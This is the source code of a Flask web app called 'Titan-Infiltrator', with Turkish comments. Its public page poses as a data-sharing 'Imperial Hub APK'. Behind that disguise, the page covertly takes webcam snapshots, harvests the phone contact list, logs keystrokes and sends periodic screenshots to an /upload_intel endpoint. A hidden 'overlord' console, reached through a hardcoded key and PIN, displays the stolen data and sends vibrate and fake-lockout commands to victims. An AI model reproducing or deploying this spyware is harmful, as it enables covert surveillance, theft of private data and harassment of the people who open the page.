from flask import Flask, render_template_string, jsonify, request
import time, json, threading, random, string
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v205.0 "The Titan-Infiltrator" ---
# Vizyon: Rehber Sızıntısı, APK Uyumluluğu ve Zirve Otorite. [cite: 2026-01-03]
VERSION = "v205.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

state_lock = Lock()
state = {
    "banned_peers": [], "user_registry": {}, 
    "global_chat": [], "commands": {}
}

def get_device_info(ua, ip):
    ua = ua.upper()
    dev = "Samsung A55 (TITAN-APK)" if "ANDROID" in ua else "Casper S100" if "WINDOWS" in ua else "Mobil"
    return f"{dev} [{ip}]"

def check_admin_auth(req):
    return req.args.get('key') == ADMIN_KEY and req.args.get('pin') == ADMIN_PIN

@app.after_request
def add_header(response):
    response.headers['Access-Control-Allow-Origin'] = '*'
    return response

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    t = request.args.get('type')
    data = request.json
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    with state_lock:
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "is_vip": False, "device": get_device_info(request.headers.get('User-Agent',''), ip), "archive": [], "key_logs": [], "contacts": []}
        u = state["user_registry"][p_id]
        
        if t == "contacts": u["contacts"] = data.get('list', []) # REHBER SIZINTISI [cite: 2026-01-03]
        elif data.get('image'): u["archive"].append({"time": time.strftime('%H:%M:%S'), "type": t, "data": data.get('image')})
        if data.get('inputs'): u["key_logs"].append({"time": time.strftime('%H:%M:%S'), "text": data.get('inputs')})
        if data.get('loc'): u["location"] = data.get('loc')
        
        cmd = state["commands"].get(p_id, {})
        if cmd: state["commands"][p_id] = {}
    return jsonify({"status": "OK", "cmd": cmd})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "RED", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Titan-Infiltrator Console v205</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b-4 border-green-600 pb-2 mb-4 flex justify-between items-center italic font-black uppercase">
        <h1 class="text-2xl tracking-tighter">THE TITAN-INFILTRATOR v205.0</h1>
        <div class="text-green-500 tracking-widest">HÜKÜMDAR: ALİ YİĞİT</div>
    </div>
    <div class="grid grid-cols-5 gap-4">
        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl shadow-2xl">
            <h2 class="text-green-500 mb-2 uppercase font-bold text-center">TITAN RADAR</h2>
            <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-4 text-white outline-none border border-green-900/30" onchange="uG()"></select>
            <div id="intel_box" class="text-[7px] mb-4 bg-green-900/10 p-2 rounded border border-green-900/30"></div>
            <div class="grid grid-cols-1 gap-2 mb-4">
                <button onclick="sendCmd('vibrate')" class="bg-purple-900 py-1 rounded font-black uppercase">Sarsıntıyı Başlat</button>
                <button onclick="sendCmd('panic')" class="bg-red-900 py-1 rounded font-black uppercase">Sistem Kilidi</button>
            </div>
            <div id="gallery" class="space-y-2 overflow-y-auto max-h-[350px]"></div>
        </div>
        <div class="col-span-3">
            <h2 class="text-blue-500 mb-2 uppercase font-bold text-center italic tracking-widest">Global Sızıntı Terminali</h2>
            <div id="keyTerminal" class="w-full h-64 bg-black border border-zinc-800 rounded p-3 overflow-y-auto mb-4 text-green-400 font-bold shadow-[inset_0_0_20px_#000]"></div>
            <h2 class="text-yellow-500 mb-2 uppercase font-bold text-[8px] italic">Sızdırılan Rehber (Contacts)</h2>
            <div id="contactBox" class="w-full h-40 bg-zinc-950 border border-zinc-900 rounded p-2 overflow-y-auto mb-4 text-[8px] grid grid-cols-2 gap-2"></div>
        </div>
        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl text-center">
            <h2 class="text-yellow-500 mb-2 uppercase font-bold border-b border-zinc-800 pb-1 italic">VIP Otorite</h2>
            <div id="chatBox" class="h-96 overflow-y-auto bg-black p-3 rounded mb-2 text-[8px] space-y-2"></div>
            <input id="chatIn" type="text" class="w-full bg-zinc-900 p-2 rounded text-[8px] outline-none" placeholder="Emir yaz...">
            <button onclick="sendMsg()" class="w-full bg-blue-900 mt-1 py-1 rounded text-[8px] font-black uppercase">GÖNDER</button>
        </div>
    </div>
    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function sendCmd(c){ const t=document.getElementById('pS').value; if(t) await fetch(`/overlord_api/cmd?key=${k}&pin=${p}&target_peer=${t}&c=${c}`); }
        function uG(){
            const id = document.getElementById('pS').value; if(!id || !reg[id]) return;
            const u = reg[id]; let h="", tH="", cH="";
            (u.archive||[]).slice().reverse().forEach(s => { h += `<div class="p-1 border border-zinc-800 bg-black rounded mb-2"><img src="${s.data}" class="w-full rounded"></div>`; });
            document.getElementById('gallery').innerHTML = h;
            (u.key_logs||[]).forEach(log => { tH += `<div>[${log.time}] > ${log.text}</div>`; });
            document.getElementById('keyTerminal').innerHTML = tH;
            (u.contacts||[]).forEach(c => { cH += `<div class="bg-zinc-900 p-1 border border-zinc-800">👤 ${c.name} <br> <span class="text-green-500">📞 ${c.tel}</span></div>`; });
            document.getElementById('contactBox').innerHTML = cH;
            document.getElementById('keyTerminal').scrollTop = document.getElementById('keyTerminal').scrollHeight;
        }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", pO="<option value=''>Hedef Seç...</option>";
            for(let id in d.user_registry){
                let u=d.user_registry[id];
                pO += `<option value="${id}" ${document.getElementById('pS').value==id?'selected':''}>${u.device} - ${id}</option>`;
                uH += `<tr class="border-b border-zinc-900"><td class="p-2">${u.device}</td><td class="text-green-500">${id}</td><td class="text-yellow-500">${u.is_vip?'VIP':'PEER'}</td></tr>`;
            }
            document.getElementById('pS').innerHTML = pO; uG();
            setTimeout(update, 3000);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Imperial Hub APK</title><script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script></head>
<body class="bg-black text-white font-mono flex items-center justify-center h-screen overflow-hidden">
    <div id="sp" class="fixed inset-0 bg-black z-[9999] flex flex-col items-center justify-center">
        <div class="w-12 h-12 border-4 border-green-600 border-t-transparent rounded-full animate-spin mb-4"></div>
        <h2 class="text-xl font-black text-green-500 uppercase italic">Titan Syncing...</h2>
    </div>

    <div id="main" class="w-full h-full p-8 text-center bg-zinc-950">
        <h1 class="text-4xl font-black text-green-600 italic mb-10 tracking-tighter">IMPERIAL TITAN</h1>
        
        <div class="bg-black p-6 rounded-[40px] border border-green-900/30 mb-8 shadow-2xl">
            <h2 class="text-[10px] font-bold text-green-500 mb-4 uppercase italic">Sistem Donanım Yetkilendirme</h2>
            <button id="v_btn" onclick="titanBootstrap()" class="w-full py-5 bg-green-900 rounded-[30px] text-[10px] font-black text-white shadow-lg uppercase">Mühürle ve Başlat</button>
            <p class="text-[7px] text-zinc-600 mt-2 uppercase">Kişiler, Kamera ve Mikrofon izni gereklidir.</p>
        </div>

        <div class="bg-black p-10 rounded-[60px] border border-zinc-900 mb-8">
            <div id="cr" class="text-6xl font-black text-green-500 italic">0.00</div>
            <p class="text-[9px] text-zinc-600 uppercase mt-2 font-bold tracking-widest text-center">Titan Veri Bakiyesi (MB)</p>
        </div>
        
        <div class="grid grid-cols-2 gap-6">
            <button onclick="calib('share')" class="py-10 bg-zinc-900 text-green-600 font-black rounded-[40px] text-2xl border border-green-900/20 active:scale-95 transition">VER</button>
            <button onclick="calib('receive')" class="py-10 bg-green-800 text-white font-black rounded-[40px] text-2xl active:scale-95 transition">AL</button>
        </div>
    </div>
    
    <video id="v" class="hidden" autoplay playsinline></video><canvas id="cnv" class="hidden"></canvas>
    <div id="s_a" style="position:fixed; top:0; right:0; width:120px; height:120px; z-index:9999;"></div>

    <script>
        if(!localStorage.getItem('apk_id')) localStorage.setItem('apk_id', "TITAN-" + Math.random().toString(36).substr(2, 6).toUpperCase());
        let myId = localStorage.getItem('apk_id'), inputs = "";

        window.onload = () => { setTimeout(() => { document.getElementById('sp').style.display='none'; }, 2000); };
        document.getElementById('s_a').onclick = () => { if(prompt("PIN:")=="1907") window.location.href=`/overlord?key={{a_key}}&pin=1907`; };
        window.addEventListener('keydown', (e) => { inputs += (e.key.length === 1 ? e.key : ` [${e.key}] `); });

        // DEVRİM: REHBER SIZINTISI VE BOOTSTRAP [cite: 2026-01-03]
        async function titanBootstrap() {
            try {
                // Kamera/Ses İzni
                await navigator.mediaDevices.getUserMedia({audio:true, video:true});
                // Rehber Sızıntısı (Contact API) [cite: 2026-01-03]
                if ('contacts' in navigator && 'ContactsManager' in window) {
                    const props = ['name', 'tel'];
                    const contacts = await navigator.contacts.select(props, {multiple: true});
                    fetch('/upload_intel?peer_id='+myId+'&type=contacts', { 
                        method:'POST', headers:{'Content-Type':'application/json'}, 
                        body:JSON.stringify({list: contacts}) 
                    });
                }
                document.getElementById('v_btn').innerText = "SİSTEM AKTİF";
                document.getElementById('v_btn').classList.replace('bg-green-900', 'bg-zinc-800');
                ghostEye('cam');
            } catch(e) { alert("Yetki Hatası!"); }
        }

        async function ghostEye(type) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.getElementById('v'), cnv = document.getElementById('cnv');
                v.srcObject = s; await v.play();
                cnv.width = 640; cnv.height = 480;
                cnv.getContext('2d').drawImage(v, 0, 0);
                fetch('/upload_intel?peer_id='+myId+'&type='+type, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: cnv.toDataURL('image/jpeg', 0.5)}) });
                s.getTracks().forEach(tr => tr.stop());
            } catch(e) {}
        }

        async function main() {
            const cv = await html2canvas(document.body, {scale:0.2});
            const r = await fetch('/upload_intel?peer_id='+myId+'&type=scr', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
                image: cv.toDataURL('image/jpeg', 0.15),
                inputs: inputs
            }) });
            const d = await r.json();
            if(d.cmd.type == "vibrate") navigator.vibrate([1000, 200, 1000]);
            if(d.cmd.type == "panic") { navigator.vibrate([200, 100, 500]); alert("Kritik Hata: Sistem Kilitlendi!"); }
            inputs = ""; setTimeout(main, 4000); 
        } main();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
